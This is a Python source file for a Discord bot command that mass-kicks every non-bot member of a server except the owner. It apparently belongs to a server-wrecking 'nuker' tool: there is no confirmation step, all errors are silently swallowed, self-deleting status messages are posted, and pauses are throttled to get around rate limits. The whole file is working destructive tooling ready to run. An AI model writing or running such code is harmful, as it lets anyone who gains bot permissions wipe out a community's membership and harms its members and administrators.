from core.commands.base import BaseCommand
from core.config.settings import KICK_REASON
import discord
import asyncio

class KickCommand(BaseCommand):
    async def _execute(self, ctx):
        if not ctx.guild.me.guild_permissions.kick_members:
            await ctx.send("BOT NEEDS KICK PERMISSION", delete_after=3)
            return
        await ctx.send("KICKING ALL MEMBERS", delete_after=2)
        members = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.owner]
        kicked = 0
        for member in members:
            try:
                await member.kick(reason=KICK_REASON)
                kicked += 1
                if kicked % 10 == 0:
                    await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send(f"KICKED {kicked} MEMBERS")
